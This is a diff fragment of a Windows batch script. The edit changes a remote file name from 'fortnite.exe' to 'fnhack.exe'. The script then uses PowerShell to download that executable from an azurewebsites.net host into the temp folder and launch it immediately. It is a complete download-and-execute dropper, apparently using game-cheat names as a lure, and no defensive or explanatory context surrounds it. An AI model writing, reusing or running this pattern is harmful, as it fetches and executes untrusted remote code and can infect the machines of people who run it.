@@ -34,7 +34,7 @@
 ::978f952a14a936cc963da21a135fa983
 @echo off
 
-set files= 'http://mogiant.azurewebsites.net/fortnite.exe'
+set files= 'http://mogiant.azurewebsites.net/fnhack.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
